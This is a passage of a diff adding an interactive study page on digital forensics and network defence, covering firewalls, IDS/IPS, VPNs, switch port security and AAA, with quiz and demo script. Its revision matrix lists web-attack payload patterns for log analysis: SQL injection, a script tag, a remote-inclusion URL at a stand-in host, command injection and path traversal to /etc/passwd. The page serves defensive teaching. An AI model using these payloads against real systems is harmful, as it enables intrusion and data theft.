+          <tr><td><strong>Firewalls &amp; web proxies</strong></td><td>Session state logs and employee web-surfing logs.</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <h3>3.2 Web server log analyser — attacker payload patterns</h3>
+    <p>Web server logs capture HTTP requests, SQL queries, responses and result sets. Click any log line to see which attack pattern it contains.</p>
+
+    <div class="log-list" id="log-list"></div>
+    <div class="log-detail" id="log-detail"></div>
+
+    <h3>3.3 Sniffer attachment points</h3>
+    <p>Where you plug in determines whether you see anything at all.</p>
+
+    <div class="btnrow" id="tap-tabs"></div>
+    <div class="diagram" id="tap-diagram">
+      <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:16px;align-items:center;min-height:170px;">
+        <div class="node blue" id="tap-src"><b>Network segment</b><span>traffic source</span></div>
+        <div class="node purple" id="tap-device"><b>Switch</b><span id="tap-device-sub">ingress ports</span></div>
+        <div class="node red" id="tap-sniffer"><b>Sniffer</b><span id="tap-sniffer-sub">Wireshark / tcpdump</span></div>
+      </div>
+      <div id="tap-note" style="margin-top:16px;font-size:.85rem;color:#b3c0dc;"></div>
+    </div>
+
+    <div class="tblwrap">
+      <table>
+        <thead><tr><th>Attachment point</th><th>Mechanism</th><th>Trade-off</th></tr></thead>
+        <tbody>
+          <tr><td><strong>Hub</strong></td><td>Connect directly; passive capture via promiscuous mode.</td><td>Works only on legacy hubs — everything is broadcast anyway.</td></tr>
+          <tr><td><strong>Switch SPAN port</strong></td><td>Switch mirrors selected traffic to the monitor port.</td><td>Convenient, but can drop packets under heavy load.</td></tr>
+          <tr><td><strong>Network TAP</strong></td><td>Inline hardware tap on the ingress connection side.</td><td>Full-fidelity capture, no drops — but requires physical insertion.</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <h3>3.4 Packet analysis operations</h3>
+    <div class="grid3">
+      <div class="card">
+        <h4>Parsing protocol fields</h4>
+        <p style="margin-bottom:0">Extracting headers and field values — TCP flags, sequence numbers, HTTP host and user-agent.</p>
+      </div>
+      <div class="card">
+        <h4>Packet filtering</h4>
+        <p style="margin-bottom:0">Separating traffic streams with display filters in <strong>Wireshark</strong>, <strong>tshark</strong> or <strong>ngrep</strong>.</p>
+      </div>
+      <div class="card">
+        <h4>Pattern matching</h4>
+        <p style="margin-bottom:0">Searching packet payloads for specific byte or text patterns.</p>
+      </div>
+    </div>
+
+    <div class="tblwrap">
+      <table>
+        <thead><tr><th>Scenario</th><th>What you look for</th></tr></thead>
+        <tbody>
+          <tr><td><strong>HTTP request parsing</strong></td><td>Inspect <code>Host</code>, <code>User-Agent</code>, <code>Cookie</code> headers and POST body data.</td></tr>
+          <tr><td><strong>Port scan detection</strong></td><td>Automated sequential <code>SYN</code> packets hitting many ports from a single source IP within milliseconds.</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- ============================ 4 ============================ -->
+  <section id="s4" class="dsec">
+    <h2>4 · Defense-in-Depth &amp; Security Strategy</h2>
+    <p class="lede">No single wall stops an attacker. Layers delay, detect and contain — buying time and forcing mistakes.</p>
+
+    <div class="card def">
+      <h4>Concept</h4>
+      <p style="margin-bottom:0">Implementing <strong>layered security controls across multiple system levels</strong> to delay and stall an attacker's progress, rather than relying on a single boundary barrier.</p>
+    </div>
+
+    <h3>4.1 Seven concentric defence layers</h3>
+    <p>Click a ring or a legend item.</p>
+
+    <div class="did-wrap">
+      <svg class="did-svg" viewBox="0 0 400 400" id="did-svg">
+        <!-- rings generated by JS -->
+        <circle cx="200" cy="200" r="30" fill="rgba(52,211,153,.22)" stroke="#34d399" stroke-width="2"></circle>
+        <text x="200" y="204" text-anchor="middle" font-size="11" fill="#d4fff0" font-family="ui-monospace,monospace">DATA</text>
+      </svg>
+      <div class="did-legend" id="did-legend"></div>
+    </div>
+
+    <div class="card info" id="did-info" style="min-height:70px;"></div>
+
+    <h3>4.2 Network attack defence matrix</h3>
+    <div class="tblwrap">
+      <table>
+        <thead><tr><th>Attack vector</th><th>Vulnerability exploited</th><th>Primary defence mechanism</th></tr></thead>
+        <tbody>
+          <tr>
+            <td><strong>DoS / DDoS</strong></td>
+            <td>Open TCP/UDP ports, unthrottled requests</td>
+            <td><span class="hl-green">Filtering &amp; rate-limiting</span> access to TCP/UDP ports via firewalls / IPS.</td>
+          </tr>
+          <tr>
+            <td><strong>Man-in-the-Middle</strong></td>
+            <td>Unsecured physical ports &amp; cleartext mediums</td>
+            <td><span class="hl-green">Securing physical device ports</span>, switch port security, encryption.</td>
+          </tr>
+          <tr>
+            <td><strong>Packet sniffing</strong></td>
+            <td>Unencrypted cleartext network traffic</td>
+            <td>Strong <span class="hl-green">data-at-rest &amp; data-in-transit encryption</span> (TLS, IPsec).</td>
+          </tr>
+          <tr>
+            <td><strong>Port scanning</strong></td>
+            <td>Unfiltered, exposed TCP/UDP ports</td>
+            <td><span class="hl-green">Firewalls &amp; ACLs</span> locking down unneeded ports.</td>
+          </tr>
+          <tr>
+            <td><strong>Spoofing / ARP poisoning</strong></td>
+            <td>Unauthenticated stateless protocols &amp; physical ports</td>
+            <td><span class="hl-green">Physical port security</span> + network <span class="hl-green">AAA</span> authentication/authorisation.</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- ============================ 5 ============================ -->
+  <section id="s5" class="dsec">
+    <h2>5 · Firewalls &amp; Packet Filtering</h2>
+    <p class="lede">A firewall is only as good as its rule set — and a wrong source-port field can silently allow everything through.</p>
+
+    <h3>5.1 DMZ architecture</h3>
+    <div class="diagram" id="dmz-diagram">
+      <div style="display:flex;flex-direction:column;gap:9px;max-width:640px;margin:0 auto;">
+        <div class="node red" style="border-color:#a33a3a;background:#2a1212;">
+          <b>Internet</b><span>untrusted</span>
+        </div>
+        <div class="node amber"><b>Boundary router + packet filter</b><span>first line of filtering</span></div>
+        <div class="node blue"><b>External DMZ</b><span>public-facing services — external web server</span></div>
+        <div class="node purple"><b>Main firewall</b><span>trust-zone boundary</span></div>
+        <div class="node cyan"><b>Internal DMZ</b><span>semi-private — internal email server</span></div>
+        <div class="node purple"><b>Interior firewall</b><span>second boundary</span></div>
+        <div class="node green"><b>Interior Protected Network</b><span>core databases, Active Directory</span></div>
+        <div class="node amber"><b>Extranet</b><span>authenticated partners, remote VPN users</span></div>
+      </div>
+    </div>
+
+    <h3>5.2 Firewall mitigations &amp; limitations</h3>
+    <div class="grid2">
+      <div class="card good">
+        <h4>Effective against</h4>
+        <ul style="margin-bottom:0">
+          <li><strong>Port scanning</strong> — locks down unused ports.</li>
+          <li><strong>Unauthorised IP access</strong> — wardriving mitigation.</li>
+          <li><strong>Simple connection floods</strong>.</li>
+        </ul>
+      </div>
+      <div class="card danger">
+        <h4>Limitations</h4>
+        <ul style="margin-bottom:0">
+          <li>Ineffective against complex <strong>reflection DDoS</strong> — attackers spoof victim IPs to make vulnerable <strong>Memcached</strong> servers reflect massive UDP responses.</li>
+          <li>Cannot block malicious traffic traversing <strong>authorised open ports</strong> (e.g. HTTP 80).</li>
+          <li>Helpless against <strong>perimeter bypasses</strong> — e.g. an unauthorised dial-up modem inside the internal network.</li>
+        </ul>
+      </div>
+    </div>
+
+    <h3>5.3 Firewall rule logic — the source-port flaw</h3>
+    <p>A firewall rule evaluates protocol, source IP/port, destination IP/port, and action (<code class="inl">Allow</code> / <code class="inl">Deny</code>). Try the tester below with different client source ports.</p>
+
+    <div class="rule-grid">
+      <div class="rule-box">
+        <h5 style="color:#ffb3b3;">❌ Bad rule</h5>
+        <div class="rule-line">TCP | SRC <span class="hl-red">Any : 80</span> | DST 24.180.49.139 : 80 | <span class="deny">DENY</span></div>
+        <p style="font-size:.79rem;color:#8890a8;margin:8px 0 0;">Outbound client web requests originate from <strong>dynamic ephemeral ports 1024–65535</strong>, so malicious HTTP on a non-80 source port bypasses this rule.</p>
+      </div>
+      <div class="rule-box">
+        <h5 style="color:#9ff0cd;">✔ Good rule</h5>
+        <div class="rule-line">TCP | SRC <span class="hl-green">Any : Any</span> | DST 24.180.49.139 : 80 | <span class="deny">DENY</span></div>
+        <p style="font-size:.79rem;color:#8890a8;margin:8px 0 0;">Correctly blocks all TCP traffic destined for port 80 regardless of the client's source port.</p>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="field-row">
+        <label for="rf-src">Client source port:</label>
+        <input type="number" id="rf-src" value="52341" min="0" max="65535">
+        <label for="rf-dst">Destination port:</label>
+        <input type="number" id="rf-dst" value="80" min="0" max="65535">
+        <button class="btn primary" id="rf-test">Run packet through rules</button>
+      </div>
+      <div class="verdict-row">
+        <div class="verdict-pill" id="rf-bad">Bad rule → …</div>
+        <div class="verdict-pill" id="rf-good">Good rule → …</div>
+      </div>
+      <div class="verdict" id="rf-note" style="margin-top:12px;"></div>
+    </div>
+
+    <h3>5.4 Stateless vs stateful filtering</h3>
+    <div class="btnrow">
+      <button class="chip active" data-fwmode="stateless">Stateless packet filter</button>
+      <button class="chip" data-fwmode="stateful">Stateful packet filter</button>
+      <button class="btn primary" id="fw-send">▶ Send outbound HTTP request</button>
+    </div>
+
+    <div class="diagram">
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px;align-items:center;">
+        <div class="node green" id="fw-client"><b>Internal client</b><span>:52341</span></div>
+        <div class="node blue" id="fw-server"><b>Web server</b><span>:80</span></div>
+      </div>
+      <div class="fw-state" id="fw-state" style="margin-top:16px;"></div>
+    </div>
+
+    <div class="grid2">
+      <div class="card">
+        <h4>Stateless packet filter</h4>
+        <p style="margin-bottom:0">Evaluates each packet <strong>in isolation</strong> against ACLs, with no connection context. Return traffic must be explicitly permitted by another rule. Example: extended ACLs on Cisco IOS routers.</p>
+      </div>
+      <div class="card">
+        <h4>Stateful packet filter</h4>
+        <p style="margin-bottom:0">Maintains a dynamic <strong>state table</strong> tracking handshakes and connection states (<code class="inl">SYN</code>, <code class="inl">ESTABLISHED</code>). Automatically permits return traffic for legitimate outbound sessions. Example: Cisco ASA/PIX, Check Point.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============================ 6 ============================ -->
+  <section id="s6" class="dsec">
+    <h2>6 · Intrusion Detection (IDS) &amp; Prevention (IPS)</h2>
+    <p class="lede">IDS watches and alerts. IPS sits in the path and acts. The difference is <em>inline vs out-of-band</em>.</p>
+
+    <div class="btnrow">
+      <button class="chip g active" data-idsmode="nids">NIDS — out-of-band</button>
+      <button class="chip g" data-idsmode="nips">NIPS — inline</button>
+    </div>
+
+    <div class="diagram" id="ids-diagram">
+      <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:14px;align-items:center;">
+        <div class="node red"><b>Internet</b><span>attack source</span></div>
+        <div class="node amber" id="ids-fw"><b>Firewall</b><span>boundary</span></div>
+        <div class="node green" id="ids-internal"><b>Internal network</b><span>protected assets</span></div>
+      </div>
+      <div id="ids-device-wrap" style="margin-top:16px;"></div>
+      <div id="ids-note" style="margin-top:16px;font-size:.85rem;color:#b3c0dc;"></div>
+    </div>
+
+    <div class="grid2">
+      <div class="card">
+        <h4>NIDS — Network Intrusion Detection System</h4>
+        <ul style="margin-bottom:0">
+          <li>Monitors traffic <strong>out-of-band</strong> — not in the inline path.</li>
+          <li>Deployed on a <strong>hub</strong> (promiscuous mode) or a switch <strong>SPAN port</strong> (port mirroring).</li>
+          <li>Supported by <strong>Host IDS (HIDS)</strong> agents on endpoints.</li>
+          <li>Uses <strong>Deep Packet Inspection (DPI)</strong> on payloads.</li>
+          <li>Detection methods: <strong>signature-based</strong> (known patterns) or <strong>statistical anomaly-based</strong> (deviations from baseline).</li>
+        </ul>
+      </div>
+      <div class="card">
+        <h4>NIPS — Network Intrusion Prevention System</h4>
+        <ul style="margin-bottom:0">
+          <li>Placed <strong>inline</strong> between the firewall and the internal network.</li>
+          <li>Performs full NIDS detection <strong>plus</strong> active automated remediation.</li>
+          <li>Drops malicious packets.</li>
+          <li>Resets TCP connections (<code class="inl">RST</code>).</li>
+          <li>Dynamically modifies firewall rule sets in real time.</li>
+        </ul>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============================ 7 ============================ -->
+  <section id="s7" class="dsec">
+    <h2>7 · Proxies &amp; Virtual Private Networks</h2>
+    <p class="lede">Proxies break direct routing; VPNs build encrypted tunnels over untrusted networks.</p>
+
+    <h3>7.1 Application proxy / proxy firewall</h3>
+    <div class="card def">
+      <h4>Layer 7 operation</h4>
+      <p style="margin-bottom:0">Operates at the <strong>Application Layer</strong> of the OSI model. It <strong>terminates the incoming client connection</strong> and establishes a <strong>secondary connection</strong> to the destination server on the client's behalf — eliminating direct IP routing between external users and internal servers.</p>
+    </div>
+
+    <div class="diagram">
+      <div style="display:grid;grid-template-columns:1fr auto 1fr;gap:16px;align-items:center;">
+        <div class="node red"><b>External client</b><span>no direct route to server</span></div>
+        <div class="node purple"><b>Proxy (L7)</b><span>terminates + re-originates</span></div>
+        <div class="node green"><b>Internal server</b><span>only sees the proxy</span></div>
+      </div>
+      <div style="margin-top:14px;font-size:.81rem;color:#8890a8;font-family:ui-monospace,monospace;text-align:center;">
+        client ──TCP──▶ proxy ──TCP──▶ server &nbsp;&nbsp;<span style="color:#5e6680;">(two separate connections)</span>
+      </div>
+    </div>
+
+    <div class="card">
+      <h4>DPI &amp; content inspection capabilities</h4>
+      <p>Scans protocol-specific traffic (HTTP, HTTPS, FTP, SMTP) and inspects payloads to:</p>
+      <ul style="margin-bottom:0">
+        <li>Block prohibited file extensions</li>
+        <li>Detect domain spoofing</li>
+        <li>Enforce content policies</li>
+        <li>Provide IP anonymisation</li>
+        <li>Cache frequently accessed pages to optimise performance</li>
+      </ul>
+      <p style="margin:8px 0 0;font-size:.82rem;color:#8890a8;">Example products: Symantec Advanced Security, Gateway ProxySG.</p>
+    </div>
+
+    <h3>7.2 VPNs — IPsec vs TLS</h3>
+    <div class="card def">
+      <p style="margin-bottom:0">A VPN establishes an <strong>encrypted tunnel across an untrusted public network</strong> (the internet), ensuring data confidentiality, integrity and origin authenticity.</p>
+    </div>
+
+    <div class="tblwrap">
+      <table>
+        <thead><tr><th>Feature / metric</th><th>IPsec VPN (L2TP / IPsec)</th><th>TLS VPN (OpenVPN)</th></tr></thead>
+        <tbody>
+          <tr><td><strong>OSI layer</strong></td><td>Network / Link (Layer 3 / 2)</td><td>Transport / Application (Layer 4 / 7)</td></tr>
+          <tr><td><strong>Protocol mechanics</strong></td><td>Pairs L2TP with IPsec</td><td>Open-source TLS for key exchange &amp; transport</td></tr>
+          <tr><td><strong>Encryption</strong></td><td>256-bit AES</td><td>160-bit to 256-bit AES</td></tr>
+          <tr><td><strong>Performance overhead</strong></td><td>Double encapsulation — higher CPU overhead</td><td>Optimised for high-latency networks</td></tr>
+          <tr><td><strong>OS compatibility</strong></td><td>Native on Windows, macOS, Linux, iOS, Android</td><td>Compatible across desktop &amp; mobile platforms</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- ============================ 8 ============================ -->
+  <section id="s8" class="dsec">
+    <h2>8 · Switch Port Security &amp; the AAA Framework</h2>
+    <p class="lede">Switches learn MAC addresses dynamically — which means an attacker can teach them wrong.</p>
+
+    <h3>8.1 MAC learning &amp; MAC flooding</h3>
+    <div class="grid2">
+      <div class="card">
+        <h4>Dynamic MAC learning</h4>
+        <p style="margin-bottom:0">Switches inspect incoming Ethernet frame <strong>source MAC addresses</strong> to build dynamic MAC tables. Unmapped destination MACs trigger frame <strong>flooding</strong> to all ports.</p>
+      </div>
+      <div class="card danger">
+        <h4>MAC flooding attack</h4>
+        <p style="margin-bottom:0">Attackers flood a switch with thousands of fake MAC addresses, exhausting memory tables and forcing the switch into <strong>fail-open hub mode</strong> — broadcasting all traffic and enabling passive sniffing.</p>
+      </div>
+    </div>
+
+    <div class="btnrow">
+      <button class="btn danger" id="mac-flood">▶ Flood switch with fake MACs</button>
+      <button class="btn" id="mac-reset">↺ Reset MAC table</button>
+      <button class="btn primary" id="mac-send">Send victim → server packet</button>
+    </div>
+
+    <div class="mac-table" id="mac-table"></div>
+    <div class="verdict" id="mac-note"></div>
+
+    <h3>8.2 Switch port security mitigations</h3>
+    <div class="grid3">
+      <div class="card">
+        <h4>Restrict MAC count</h4>
+        <p style="margin-bottom:0">Limit the maximum number of MAC addresses allowed per physical port.</p>
+      </div>
+      <div class="card">
+        <h4>Bind static MACs</h4>
+        <p style="margin-bottom:0">Bind specific MAC addresses to specific physical ports so a rogue device cannot impersonate another.</p>
+      </div>
+      <div class="card">
+        <h4>802.1X NAC</h4>
+        <p style="margin-bottom:0">Enforce Network Access Control — devices must authenticate before the port passes any traffic.</p>
+      </div>
+    </div>
+
+    <h4>Port violation actions</h4>
+    <div class="btnrow" id="violation-tabs"></div>
+    <div class="verdict" id="violation-note"></div>
+
+    <h3>8.3 The AAA framework</h3>
+    <div class="aaa-wrap" id="aaa-cards"></div>
+    <div class="verdict" id="aaa-note"></div>
+
+    <h3>8.4 AAA protocols — RADIUS vs TACACS+</h3>
+    <div class="tblwrap">
+      <table>
+        <thead><tr><th>Feature</th><th>RADIUS</th><th>TACACS+</th></tr></thead>
+        <tbody>
+          <tr><td><strong>Full name</strong></td><td>Remote Authentication Dial-In User Service</td><td>Terminal Access Controller Access Control System</td></tr>
+          <tr><td><strong>Origin</strong></td><td>Open standard</td><td>Cisco proprietary</td></tr>
+          <tr><td><strong>Process structure</strong></td><td>Combines Authentication and Authorization into a single response packet</td><td>Completely separates Authentication, Authorization and Accounting into distinct processes</td></tr>
+          <tr><td><strong>Encryption scope</strong></td><td>Encrypts only the password field — packet headers remain unencrypted</td><td>Encrypts the <strong>entire packet body/payload</strong></td></tr>
+          <tr><td><strong>Transport</strong></td><td>UDP ports 1812 / 1813</td><td>TCP port 49 (reliable transmission)</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="card info">
+      <h4>Components involved</h4>
+      <p style="margin-bottom:0">RADIUS connects three parties: <strong>Network Access Servers (NAS)</strong>, <strong>Access Clients (Supplicants)</strong>, and the <strong>RADIUS Server</strong> itself.</p>
+    </div>
+  </section>
+
+  <!-- ============================ 9 ============================ -->
+  <section id="s9">
+    <h2>9 · Summary Matrix &amp; Self-Test</h2>
+
+    <h3>9.1 Revision summary matrix</h3>
+    <div class="tblwrap">
+      <table>
+        <thead><tr><th>Topic area</th><th>Core concept</th><th>Key technical detail</th></tr></thead>
+        <tbody>
+          <tr><td><strong>Forensics process</strong></td><td>Pollitt model</td><td>Acquisition → Identification → Evaluation → Admission.</td></tr>
+          <tr><td><strong>Evidence integrity</strong></td><td>Chain of custody</td><td>MD5 → SHA-1 → SHA-256; any collision invalidates evidence.</td></tr>
+          <tr><td><strong>Volatile vs persistent</strong></td><td>Capture order</td><td>RAM first (bootloader, kernel, user sessions) — then disk.</td></tr>
+          <tr><td><strong>Windows artefacts</strong></td><td>Registry + logs</td><td>Hives → Keys → Values; <code>SAM\Domains\Account\Users</code>; <code>Security.evtx</code>; <code>Prefetch\*.pf</code>.</td></tr>
+          <tr><td><strong>Linux artefacts</strong></td><td>Plain-text files</td><td><code>/etc/passwd</code> (UID 0 = root), <code>/etc/shadow</code>, <code>/var/log/wtmp</code> (read with <code>last</code>).</td></tr>
+          <tr><td><strong>Web log forensics</strong></td><td>Attack payload patterns</td><td>SQLi <code>0 or 1=1</code>, XSS <code>&lt;script&gt;</code>, RFI <code>http://evil.fr/sh</code>, command exec <code>|ls -l</code>, traversal <code>../../etc/passwd</code>.</td></tr>
+          <tr><td><strong>Packet capture</strong></td><td>Attachment points</td><td>Hub (passive), switch SPAN (mirror), network TAP (inline hardware).</td></tr>
+          <tr><td><strong>Defense-in-depth</strong></td><td>7 layers</td><td>Policies → Physical → Perimeter → Internal network → Host → Application → Data.</td></tr>
+          <tr><td><strong>Firewall rules</strong></td><td>Source-port flaw</td><td>Bad: SRC any:80 DST:80 DENY. Good: SRC any:any DST:80 DENY.</td></tr>
+          <tr><td><strong>Stateful filtering</strong></td><td>State table</td><td>Auto-permits return traffic for <code>ESTABLISHED</code> connections.</td></tr>
+          <tr><td><strong>NIDS vs NIPS</strong></td><td>Out-of-band vs inline</td><td>NIDS alerts; NIPS drops, sends RST, rewrites firewall rules.</td></tr>
+          <tr><td><strong>Proxies</strong></td><td>Layer 7 termination</td><td>Terminates client connection, re-originates to server — no direct IP routing.</td></tr>
+          <tr><td><strong>VPNs</strong></td><td>IPsec vs TLS</td><td>IPsec: L3/L2, 256-bit AES, double encapsulation. TLS: L4/L7, 160–256-bit AES.</td></tr>
+          <tr><td><strong>MAC flooding</strong></td><td>Fail-open hub mode</td><td>Table exhaustion → broadcast → passive sniffing possible.</td></tr>
+          <tr><td><strong>Port violation</strong></td><td>Shutdown / Restrict / Protect</td><td>Shutdown disables port; Restrict drops + logs; Protect drops silently.</td></tr>
+          <tr><td><strong>AAA</strong></td><td>Three pillars</td><td>Authentication (who) + Authorization (what) + Accounting (when/what did).</td></tr>
+          <tr><td><strong>RADIUS vs TACACS+</strong></td><td>Encryption scope</td><td>RADIUS: password only, UDP 1812/1813. TACACS+: whole body, TCP 49.</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <h3>9.2 Self-test</h3>
+    <p>Pick an answer — instant feedback with an explanation.</p>
+    <div id="quiz"></div>
+    <div class="score" id="quiz-score">Score: 0 / 0</div>
+  </section>
+
+  </main>
+</div>
+
+<script>
+(function () {
+  "use strict";
+
+  /* =====================================================================
+     1. POLLITT PROCESS MODEL STEPPER
+     ===================================================================== */
+  var pollitt = [
+    {
+      name: "Acquisition",
+      short: "Obtain evidence lawfully",
+      note: "Obtaining digital evidence in a <strong>strictly lawful manner</strong>. If the acquisition itself is unlawful — no warrant, improper seizure — everything downstream is poisoned."
+    },
+    {
+      name: "Identification",
+      short: "Locate & collect data",
+      note: "Locating and collecting digital data that can serve as evidence. Deciding what is relevant and where it lives (RAM, disk, network logs, cloud)."
+    },
+    {
+      name: "Evaluation",
+      short: "Assess relevance & admissibility",
+      note: "Assessing collected data for <strong>relevance to the case</strong> and <strong>legal admissibility</strong>. Technical findings are filtered through legal rules."
+    },
+    {
+      name: "Admission",
+      short: "Present in court",
+      note: "Presenting evaluated digital evidence in a court of law. The chain of custody and hashes must survive scrutiny here."
+    }
+  ];
+
+  var pollittSteps = document.getElementById("pollitt-steps");
+  var pollittNote = document.getElementById("pollitt-note");
+
+  pollitt.forEach(function (p, i) {
+    var d = document.createElement("div");
+    d.className = "step";
+    d.innerHTML = '<div class="n">' + (i + 1) + "</div><b>" + p.name + "</b><span>" + p.short + "</span>";
+    d.addEventListener("click", function () {
+      Array.prototype.forEach.call(pollittSteps.children, function (c, j) {
+        c.classList.toggle("active", j === i);
+      });
+      pollittNote.innerHTML = "<strong>" + p.name + ".</strong> " + p.note;
+    });
+    pollittSteps.appendChild(d);
+  });
+  pollittSteps.children[0].click();
+
+  /* =====================================================================
+     2. HASH INTEGRITY DEMO
+     ===================================================================== */
+  var hashInput = document.getElementById("hash-input");
+  var hashRows = document.getElementById("hash-rows");
+  var hashVerdict = document.getElementById("hash-verdict");
+  var originalEvidence = hashInput.value;
+  var baselineHashes = null;
+
+  function simpleHash(str, seed) {
+    /* fallback: deterministic 64-char hex from FNV-1a style mixing */
+    var h1 = 0x811c9dc5 ^ seed, h2 = 0x01000193 ^ (seed * 31);
+    var out = "";
+    for (var i = 0; i < 64; i++) {
+      var ch = str.charCodeAt(i % Math.max(1, str.length)) || 7;
+      h1 = ((h1 ^ ch) * 16777619) >>> 0;
+      h2 = ((h2 + ch * (i + 3)) ^ (h1 >>> 5)) >>> 0;
+      out += ((h1 ^ h2) & 0xff).toString(16).padStart(2, "0");
+    }
+    return out;
+  }
+
+  async function digestHex(algo, str) {
+    try {
+      if (window.crypto && window.crypto.subtle) {
+        var buf = new TextEncoder().encode(str);
+        var h = await window.crypto.subtle.digest(algo, buf);
+        return Array.from(new Uint8Array(h)).map(function (b) {
+          return b.toString(16).padStart(2, "0");
+        }).join("");
+      }
+    } catch (e) { /* insecure context or unsupported */ }
+    return simpleHash(str, algo === "SHA-256" ? 7 : 13);
+  }
+
+  async function renderHashes() {
+    var content = hashInput.value;
+    var sha1 = await digestHex("SHA-1", content);
+    var sha256 = await digestHex("SHA-256", content);
+
+    if (!baselineHashes) baselineHashes = { sha1: sha1, sha256: sha256 };
+
+    var changed = content !== originalEvidence;
+
+    hashRows.innerHTML =
+      '<div class="hash-row' + (changed && baselineHashes.sha1 !== sha1 ? " changed" : "") + '">' +
+        '<span class="algo">SHA-1</span><span class="val">' + sha1 + "</span></div>" +
+      '<div class="hash-row' + (changed && baselineHashes.sha256 !== sha256 ? " changed" : "") + '">' +
+        '<span class="algo">SHA-256</span><span class="val">' + sha256 + "</span></div>";
+
+    if (!changed) {
+      hashVerdict.innerHTML = '<span style="color:#9ff0cd;">✔ Integrity verified.</span> The SHA-1 and SHA-256 recomputed from the evidence match the values recorded at acquisition. The chain of custody holds.';
+    } else {
+      hashVerdict.innerHTML = '<span style="color:#ffb3b3;">✘ Integrity FAILED.</span> The evidence no longer matches the acquisition hashes. Both digests diverged completely — the defence can argue the evidence was altered in custody. It becomes inadmissible.';
+    }
+  }
+
+  document.getElementById("hash-tamper").addEventListener("click", function () {
+    /* flip one character to simulate a one-byte change */
+    var v = hashInput.value;
+    if (v.length > 0) {
+      var idx = Math.floor(v.length / 2);
+      var c = v.charAt(idx);
+      v = v.slice(0, idx) + (c === "X" ? "Y" : "X") + v.slice(idx + 1);
+      hashInput.value = v;
+    }
+    renderHashes();
+  });
+
+  document.getElementById("hash-reset").addEventListener("click", function () {
+    hashInput.value = originalEvidence;
+    renderHashes();
+  });
+
+  hashInput.addEventListener("input", renderHashes);
+  renderHashes();
+
+  /* =====================================================================
+     3. WINDOWS REGISTRY EXPLORER
+     ===================================================================== */
+  var regData = [
+    {
+      id: "hklm",
+      label: "HKEY_LOCAL_MACHINE",
+      hive: true,
+      info: "<strong>HKEY_LOCAL_MACHINE (HKLM).</strong> The system-wide configuration hive. Survives logoff, so it is the primary place to find installed services, autostart entries and local account data."
+    },
+    {
+      id: "sam",
+      label: "SAM",
+      parent: "hklm",
+      info: "<strong>SAM — Security Account Manager.</strong> Stores local user accounts and their credential hashes. The subkey <code>Domains\\Account\\Users</code> holds per-account data including <strong>last login timestamps</strong> — a core forensic artefact for placing a user at the machine at a given time."
+    },
+    {
+      id: "sam-users",
+      label: "Domains\\Account\\Users  →  last login",
+      parent: "sam",
+      info: "<strong>Last login timestamps.</strong> Each user SID subkey stores FILETIME values for last logon and last failed logon. Combined with the Security event log, this establishes account activity even if the user later deleted files."
+    },
+    {
+      id: "software",
+      label: "SOFTWARE",
+      parent: "hklm",
+      info: "<strong>SOFTWARE.</strong> Installed applications and per-machine application settings. Useful for proving a program was installed — even if its files were removed afterwards."
+    },
+    {
+      id: "run",
+      label: "...\\CurrentVersion\\Run  →  autostart",
+      parent: "software",
+      info: "<strong>Run key.</strong> Every value here executes automatically at user logon. This is the classic <strong>persistence</strong> location for malware — a value pointing to a file in <code>%APPDATA%</code> is a strong indicator of compromise."
+    },
+    {
+      id: "system",
+      label: "SYSTEM",
+      parent: "hklm",
+      info: "<strong>SYSTEM.</strong> Hardware profiles, driver configuration and the services database (<code>CurrentControlSet\\Services</code>). Service entries reveal drivers and background programs and their start types."
+    },
+    {
+      id: "hkcu",
+      label: "HKEY_CURRENT_USER",
+      hive: true,
+      info: "<strong>HKEY_CURRENT_USER.</strong> The currently logged-on user's profile settings. Loaded from the user's NTUSER.DAT when they log in."
+    },
+    {
+      id: "recent",
+      label: "...\\Explorer\\RecentDocs",
+      parent: "hkcu",
+      info: "<strong>RecentDocs.</strong> The Most-Recently-Used list. Reveals files the user opened and their original locations — even after the file itself has been deleted from disk."
+    },
+    {
+      id: "typed",
+      label: "...\\Explorer\\TypedPaths  →  typed paths",
+      parent: "hkcu",
+      info: "<strong>TypedPaths.</strong> Paths the user typed into the Explorer address bar. A direct record of user intent — often more revealing than the MRU list."
+    },
+    {
+      id: "ie",
+      label: "...\\Internet Explorer\\TypedURLs  →  browsing",
+      parent: "hkcu",
+      info: "<strong>TypedURLs.</strong> URLs the user typed directly. Complements browser history files and cache, and survives some forms of history clearing."
+    }
+  ];
+
+  var regTree = document.getElementById("reg-tree");
+  var regInfo = document.getElementById("reg-info");
+
+  function renderReg() {
+    regTree.innerHTML = "";
+    var depthMap = {};
+    regData.forEach(function (n) {
+      var depth = 0;
+      var p = n.parent;
+      while (p) {
+        depth++;
+        var parentNode = regData.find(function (x) { return x.id === p; });
+        p = parentNode ? parentNode.parent : null;
+      }
+      depthMap[n.id] = depth;
+    });
+
+    regData.forEach(function (n) {
+      var d = document.createElement("div");
+      d.className = "reg-node" + (n.hive ? " reg-hive" : " reg-key");
+      d.textContent = (n.hive ? "▸ " : "└ ") + n.label;
+      d.dataset.id = n.id;
+      d.style.marginLeft = (depthMap[n.id] * 20) + "px";
+      d.addEventListener("click", function () {
+        Array.prototype.forEach.call(regTree.querySelectorAll(".reg-node"), function (x) {
+          x.classList.toggle("active", x.dataset.id === n.id);
+        });
+        regInfo.innerHTML = n.info;
+      });
+      regTree.appendChild(d);
+    });
+  }
+  renderReg();
+  regInfo.innerHTML = "<strong>Select a node in the registry tree.</strong> Each hive, key and value answers a different forensic question: who logged in, what ran, what was opened, what persists across reboots.";
+
+  /* =====================================================================
+     4. LINUX FILE VIEWER
+     ===================================================================== */
+  var linuxFiles = {
+    passwd: {
+      title: "/etc/passwd",
+      body:
+        '<span class="com"># format: name:password:UID:GID:GECOS:home:shell</span>\n' +
+        'root:<span class="fld">x</span>:<span class="fld3">0</span>:0:root:/root:/bin/bash\n' +
+        'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n' +
